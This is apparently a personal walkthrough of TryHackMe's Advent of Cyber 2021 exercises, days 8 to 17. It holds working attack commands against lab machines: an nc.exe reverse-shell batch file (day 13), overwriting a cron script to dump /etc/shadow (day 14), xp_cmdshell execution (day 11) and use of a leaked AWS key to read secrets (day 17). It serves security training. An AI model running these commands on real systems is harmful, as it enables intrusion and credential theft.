# [Advent of Cyber 2021](https://tryhackme.com/room/adventofcyber3)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 8: Santa's Bag of Toys

use Remmina and rdp to santa desktop

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/14bb163e-6efa-4387-9743-230d222af0f8)

open first file on santalaptoplog, scroll down to see os version

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/637fa4c7-bb59-4f22-9d27-5ba16344ef7a)

open the 3rd file to see a command to add a backdoor user

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fd429fd8-dc1b-4834-86e2-37cf1697aea5)

on last log file, you can see a command to copy a file to desktop

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e03465ec-cedc-486d-b109-abcd1e42b988)

at the same file, scroll down a bit to see he encode the file with certutil.exe

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/34dd93b6-ac92-4772-a90d-003b27ec42d7)

decode base64 with cyberchef and save it to file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c9e93404-8cfb-4644-a278-7b5c90bba8a5)

open the file with ShellBagsExplorer on ShellBagsExplorer folder

We see the santarat as folder on the desktop. Opening it we see .github

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bdb1a9c7-fe2f-4dc2-9e19-ca6096381c6b)

Additionally, there is a unique folder named Bag of Toys on the Desktop

navigate to the folder, we have 1 file bag_of_toys.zip

search on github i see the owner of rat

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ff0e217f-74de-4d9a-ba68-584bc117c746)

look around his account, i see a operation-bag-of-toys repo

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8184b663-1cfa-4bbd-a0c7-03c3074aeea3)

back to the log files, open the 2nd log file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/111cf7bb-8d24-4003-aba8-4f7db4ab34a4)

download the zip from the github and open one file with notepad

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d42803d3-a69e-4ca1-878b-dfff841dfb47)

check the commit, you can see a note about password to the original bag_of_toys.uha archive

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/937b77c7-50f4-475d-9813-6bc3560468df)

open bag_of_toys.uha archive with UHARC in the desktop

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c4d57e61-0d96-43e1-b2a3-39e500173e69)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d9072a76-2f30-4d8a-951c-57791bab8360)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/55c29ce6-5c4c-46c6-95e5-0aa19a7a4d8e)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9e220c07-e550-4b73-85b3-9dbf11ad96a9)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3a920d6b-9aee-414c-aa33-5ba2b8d73a71)

## Day 9: Where Is All This Data Going

open the pcap file with wireshark

filter by `http.request.method == GET`, you will see /login

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/37c8fcbe-b442-4bf6-a770-6eb90c8e3c54)

try to find username, password on POST form `http.request.method == POST`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/51090aeb-3b2a-405d-93b5-ef51b5c163a3)

on User-Agent, you can see the flag

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/03ae418f-f44d-40d4-9cf4-834da1dd9449)

filter by dns method and search for "txt"

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6808c11b-7fdc-4e59-8d16-6b5196a7c7b5)

right click and follow udp stream

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c268e96e-1706-4d5d-b2d8-bab07caca737)

filter by ftp method and search for "pass"

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fd3a4b46-81cc-416d-a365-cc045d7a3939)

filter by ftp-data

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a44c8ece-f3b4-4bd9-882a-b831ffe1c476)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/26067bc2-3074-4523-95c1-34c3cff66eb9)

## Day 10: Offensive Is The Best Defence

scan the target

```
nmap -A -T4 10.10.235.19
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/08081878-5821-4e8c-aa67-83063f91fd6b)

search for the CVE number of the vulnerability that was solved in version 2.4.51

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/35802860-639b-480b-b642-ca693dd32715)

scan all ports

```
nmap -sS -T4 -p- 10.10.235.19
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/21c8add1-9055-40cd-b98b-723a52deba57)

we found a sevice on port 20212

```
nmap -sS -sV -p 20212 10.10.235.19
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8e1a359a-0500-4bbc-9a51-ce8e0f586de2)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e121db9d-5a21-4dd4-bb58-7429147cdfcc)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ef449f8e-cadd-4650-b3ee-ece1b9ef0800)

## Day 11: Where Are The Reindeers?

scan the machine

```
nmap -sS -sV -T4 -Pn 10.10.85.114
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/556969d0-2670-4e13-bd22-7656d2b1dc9b)

connect to sql server

```
sqsh -S 10.10.85.114 -U sa -P "t7uLKzddQzVjVFJp"
1> SELECT * FROM reindeer.dbo.names;
2> go
3> SELECT * FROM reindeer.dbo.schedule
4> go
5> SELECT * FROM reindeer.dbo.presents
6> go
```

another thing we can do is xp_cmdshell to execute Windows shell command

```
xp_cmdshell 'whoami'
xp_cmdshell 'dir c:\Users\grinch'
xp_cmdshell 'type c:\Users\grinch\Documents\flag.txt'
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d3e7a140-e7ef-413f-b30f-3fb0cbb71ee3)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3acbc35e-1053-443f-829d-8a4323b2e4da)

## Day 12: Sharing Without Caring

scan the target

```
nmap -sS -sV -T4 -Pn 10.10.73.165
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/939abb08-fed6-4a13-9013-48e02fc5ea4f)

notice that there is a nfs server at port 2049

```
showmount -e 10.10.73.165
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2e02782f-c669-437c-bec8-2d29c8fdc1d7)

create a mount to discover it

```
mkdir tmp
mount 10.10.73.165:/ tmp
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f1155a82-09bd-40ce-bfa4-a57e98c28386)

on share folder contain 2 text files

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1995474b-3c49-4ae5-a27f-389e80c99ba0)

you can see an id_rsa key on confidential folder

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2ac0ec6a-d8ee-4175-96c0-6c4115a0e19d)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/be172b32-a31e-446b-8161-d7d6911feb63)

## Day 13: They Lost The Plan!

we have a windows server, open powershell and list all user

```
net users
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e44d79e2-bc54-4d88-b315-1f7f685fde5f)

check the os version

```
systeminfo
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9cfb1373-553c-4480-a9e5-cc910b56c94c)

list all running services

```
wmic service list | findstr "Backup"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/36879f42-41ac-42c9-9d37-edf56aca59a3)

create a reverse script on desktop as evil.bat

```
@echo off
C:\Users\McSkidy\Downloads\nc.exe 10.10.108.203 1337 -e cmd.exe
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a12bc450-3a3d-4a27-9628-1cb92ad7b2f5)

open Iperius Backup

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b1b4fd9d-2d31-49b0-81a8-1e80fbf66720)

create new backup, you can create any backup and remember to choose destination

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5057942f-b710-492d-b805-942c80065340)

on tab other process, choose run a program or external file, click ok

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e5a22764-e76b-4bdb-b4ae-c3c8fdb718a9)

on our attack machine

```
nc -vlnp 1337
```

run the backup as service

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2527449f-41a3-4ce9-a3f3-3594755c8b5a)

we got our shell

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4e553e22-b7be-4438-89b2-0a22e6fb1bda)

```
cd C:\Users\thegrinch\Documents
type flag.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/604f7d77-686b-45c7-bbdd-71ff055bc599)

the Documents folder also contains a Schedule.txt, see it

```
dir
type Schedule.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c865ef69-e3db-4e07-abee-6e061f5300c9)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/62c157af-f95f-4e9d-9c1d-5b95fc668bb8)

## Day 14: Dev(Insecure)Ops

dirb scan with its default wordlist

```
dirb http://10.10.98.187
```



check the webpage, it seem an iframe ls.html on /admin

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/94c87108-9f8d-4bf0-85ac-b401d8133dbb)

ssh to the machine

```
ssh mcskidy@10.10.98.187
Password1
```

on /home/thegrinch/scripts, you can see 4 script files

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f53478bf-81e5-4742-81a5-b3748f74eb82)

loot.sh seem interesting and we have write access on it

```
echo "cat /etc/shadow > /var/www/html/ls.html" > loot.sh
```

reload the /admin, we will see /etc/shadow

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1f8d229b-43c3-4638-a9e1-a09627f8a737)

let's have a look at the check.sh script 

```
echo "cat /home/thegrinch/scripts/check.sh > /var/www/html/ls.html" > loot.sh
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d4e2afbd-86b8-45fa-bc1c-801a276df610)

checks to see if remindme.txt is on /tmp/check.txt, it will print the grinch's password to pass.html

```
su thegrinch
ELFSareFAST
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9c63292f-78e8-4a17-88e1-97d641133ec4)

we can login to grinch but can't see the flag on his desktop

luckily, we know the path, use the previous vulnerability

```
echo "cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html" > loot.sh
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f76b3609-28eb-43e1-b1f7-918f984c209e)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4a5ec4af-7802-4dba-b315-ff4062ccdd0c)

## Day 15: The Grinchs day off

nothing to do today

## Day 16: Ransomware Madness

our team has managed to collect a sample ransomware note, translate it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5d78a8ce-7d9e-47b2-b08b-bb1010125b19)

search on google, i see lot of information here

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a79ebcf2-0b4c-4c14-b093-673f58c7d3ed)

check his tweeter, i see a post

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4c5b5392-5a9d-4c43-8e53-f39e34b774a3)

notice there is a bitcoin address on that link

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d2d86093-5e67-4e3c-9043-f6871c04388f)

click on the bitcoin address, i see it related to github

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/86d8a443-6c12-4c82-9236-c15e8066245e)

follow github account, i see 2 repositories

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1624bd07-3edb-4174-b19c-aea2ca7af58f)

check commit on tree.sh in ChristBASHTree, you can see the information

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/22290904-ac90-47bd-a4fa-69fc55293db4)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/99fa84d6-4ed1-4955-8047-e503f8fc68d0)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4d7d3e0e-828c-4648-b061-111294467eb8)

## Day 17: Elf Leaks

HR sent out an image to announce the new site

```
https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png
```

the URL contains the name of the S3 bucket, navigate to root of bucket, you can see

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/81a71c5f-2ebf-4d78-ad27-e7439f95b9da)

we have read permission on it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/252aef17-46df-405b-bd4e-47e9c880b145)

on the last of xml bucket, you can see wp-backup.zip may interesting

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/257d84d7-0228-4ab2-9b29-fd2ad29d3772)

download the file and unzip it, find the AKIA or you can find it in wp-config

```
cat * | grep AKIA
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6cf7ba11-6b00-4f1c-8463-0fc3b1efcab1)

find the account ID belonging to the access key

```
aws sts get-access-key-info –access-key-id AKIAQI52OJVCPZXFYAOI --profile myprofile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4c5fcc57-f904-4ea6-93a9-ba4af89ccb2e)

find the username with our profile

```
aws sts get-caller-identity --profile myprofile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/35537098-e5d5-4dac-b08b-dac9a64fd43d)

open the describe of EC2 instance

```
aws ec2 describe-instances --output text --profile myprofile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f8c4fff0-7a92-4e1d-8ddb-d0e0f7db75e4)

```
aws secretsmanager help
```

in help page, we find the following list of commands

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a4811a9c-eeb5-4eca-9c1d-776da73ead88)

find out the database password stored in Secrets Manager

```
aws secretsmanager list-secrets --profile myprofile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e6c77b1d-9f7c-41a5-adbd-8c0bc5e44f31)

we got the secret id, which allow us to retrieve the secret

```
aws secretsmanager get-secret-value --secret-id HR-Pasword --profile myprofile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/227cd2d9-a61e-4f54-aa8e-5abec8452713)

the secret can't be accessed from our current region, we have to specify a region closer to Santa

i chose eu-north-1 as it is the closest to the north pole

```
aws secretsmanager get-secret-value --secret-id HR-Pasword --region eu-north-1 --profile myprofile
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/72b65223-6af5-43e3-913a-81b1ff81e29c)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f063eb06-f7d3-4c9e-aebf-28abfb1d81f4)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6e3cb633-6d26-4f22-b0e7-624f936d278f)
